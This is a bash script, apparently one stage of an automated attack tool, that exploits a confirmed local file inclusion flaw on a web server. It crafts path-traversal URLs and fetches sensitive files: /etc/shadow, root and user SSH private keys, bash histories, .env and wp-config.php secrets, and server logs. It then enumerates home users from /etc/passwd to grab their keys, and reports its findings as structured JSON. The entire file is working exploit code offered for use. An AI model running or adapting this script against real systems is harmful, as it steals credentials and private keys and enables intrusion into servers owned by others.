#!/bin/bash
# LFI File Enumeration - Read high-value files using confirmed LFI
# 用法: enumerate_files.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== LFI File Enumeration ==="

LFI_PARAM="${lfi_param:-page}"
LFI_DEPTH="${lfi_depth:-5}"
LFI_PATH="${lfi_path:-}"
LFI_STYLE="${lfi_style:-relative}"

[ -z "$LFI_PARAM" ] && LFI_PARAM="page"
[ -z "$LFI_DEPTH" ] && LFI_DEPTH="5"
[ -z "$LFI_STYLE" ] && LFI_STYLE="relative"

build_url() {
  local target_file="$1"
  if [ "$LFI_STYLE" = "absolute" ]; then
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}/${target_file}"
    else
      echo "$BASE/?$LFI_PARAM=/${target_file}"
    fi
  else
    local TRAV
    TRAV=$(printf '../%.0s' $(seq 1 "$LFI_DEPTH"))
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}${TRAV}${target_file}"
    else
      echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
    fi
  fi
}

TARGETS="/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/version
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/root/.bash_history
/home/www-data/.ssh/id_rsa
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/sites-enabled/default
/var/www/html/.htpasswd
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env"

READABLE=""
SHADOW_READABLE=false
SSH_KEY_FOUND=false
AUTH_LOG_READABLE=false
APACHE_LOG_READABLE=false
NGINX_LOG_READABLE=false
USER_FILES_FOUND=false
READABLE_LIST=""
for f in $TARGETS; do
  clean_f=$(echo "$f" | sed 's|^/||')
  url=$(build_url "$clean_f")
  echo "[READ] $url"
  result=$(curl -s "$url" --max-time 6 2>/dev/null)
  size=${#result}
  if [ "$size" -gt 10 ] && ! echo "$result" | grep -qi "not found\|no such\|failed to open\|warning.*include"; then
    echo "READABLE:$f ($size bytes)"
    echo "$result" | head -8
    echo "---"
    READABLE="$READABLE $f"
    READABLE_LIST="$READABLE_LIST\"$f\","
    case "$f" in
      */shadow|*/gshadow) SHADOW_READABLE=true ;;
      */auth.log) AUTH_LOG_READABLE=true ;;
      */apache*/access.log) APACHE_LOG_READABLE=true ;;
      */nginx/access.log) NGINX_LOG_READABLE=true ;;
    esac
    if echo "$result" | grep -q "BEGIN.*PRIVATE KEY"; then
      SSH_KEY_FOUND=true
    fi
  else
    echo "[MISS] $f (${size}B)"
  fi
done

passwd_url=$(build_url "etc/passwd")
PASSWD=$(curl -s "$passwd_url" --max-time 6 2>/dev/null)
USERS=$(echo "$PASSWD" | grep -E ":/home/" | cut -d: -f1)
for user in $USERS; do
  for keyfile in ".ssh/id_rsa" ".ssh/authorized_keys" ".bash_history"; do
    url=$(build_url "home/$user/$keyfile")
    result=$(curl -s "$url" --max-time 6 2>/dev/null)
    if [ ${#result} -gt 20 ] && ! echo "$result" | grep -qi "not found\|no such\|failed"; then
      echo "USER_FILE_READABLE:/home/$user/$keyfile"
      echo "$result" | head -10
      echo "---"
    fi
  done
done

[ -n "$READABLE" ] && echo "LFI_ENUM_OK" || echo "LFI_ENUM_EMPTY"

# ---- NDJSON structured output ----
READABLE_LIST_CLEAN=$(echo "$READABLE_LIST" | sed 's/,$//')
echo "{\"event\":\"lfi_files_readable\",\"payload\":{\"files\":[$READABLE_LIST_CLEAN],\"shadow_readable\":$SHADOW_READABLE,\"ssh_key_found\":$SSH_KEY_FOUND,\"auth_log_readable\":$AUTH_LOG_READABLE,\"apache_log_readable\":$APACHE_LOG_READABLE,\"nginx_log_readable\":$NGINX_LOG_READABLE}}"
